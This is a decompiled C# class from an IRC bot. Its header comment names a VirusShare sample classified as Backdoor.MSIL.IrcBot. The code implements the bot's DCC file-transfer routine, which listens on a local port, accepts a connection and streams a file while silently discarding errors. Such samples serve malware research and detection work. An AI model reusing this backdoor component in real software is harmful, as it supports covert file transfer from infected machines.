// Decompiled with JetBrains decompiler
// Type: Irc9.Dcc
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Irc9
{
  public sealed class Dcc
  {
    private const int bufferSize = 16384;
    private const int BufferSize = 16384;
    private Socket socket;
    private Socket serverSocket;
    private Thread thread;
    private byte[] buffer;
    private int listenPort;
    private static string directory;
    internal DccFileInfo dccFileInfo;

    public event Dcc.DccSendRequestEventHandler OnDccSendRequest;

    public event Dcc.FileTransferProgressEventHandler OnFileTransferProgress;

    internal Dcc(DccFileInfo dccFileInfo)
    {
      this.dccFileInfo = dccFileInfo;
      this.buffer = new byte[16384];
    }

    private int GetNextPort()
    {
      if (this.listenPort > 60000)
        this.listenPort = 50000;
      return this.listenPort++;
    }

    private IPEndPoint CreateEndPoint(string serverHostName, int port)
    {
      long result;
      long.TryParse(Dns.Resolve(serverHostName).AddressList[0].Address.ToString(), out result);
      return new IPEndPoint(result, port);
    }

    public void Upload()
    {
      try
      {
        IPEndPoint localEP = new IPEndPoint(DccUtil.LocalHost(), 1024);
        this.serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        this.serverSocket.Bind((EndPoint) localEP);
        this.serverSocket.Listen(1);
        this.socket = this.serverSocket.Accept();
        this.serverSocket.Close();
        this.dccFileInfo.GotoReadPosition();
        int num;
        while ((num = this.dccFileInfo.TransferStream.Read(this.buffer, 0, this.buffer.Length)) != 0)
        {
          this.socket.Send(this.buffer, 0, num, SocketFlags.None);
          this.AddBytesProcessed(num);
        }
        this.Cleanup();
      }
      catch (Exception ex)
      {
      }
    }

    internal void AddBytesProcessed(int bytesRead)
    {
      this.dccFileInfo.AddBytesTransfered(bytesRead);
      if (this.OnFileTransferProgress == null)
        ;
    }

    private void Cleanup()
    {
      if (this.serverSocket != null)
        this.serverSocket.Close();
      if (this.socket != null)
      {
        try
        {
          this.socket.Close();
        }
        catch (Exception ex)
        {
        }
      }
      this.dccFileInfo.CloseFile();
    }

    public delegate void FileTransferProgressEventHandler(int bytesSent);

    public delegate void DccSendRequestEventHandler();
  }
}
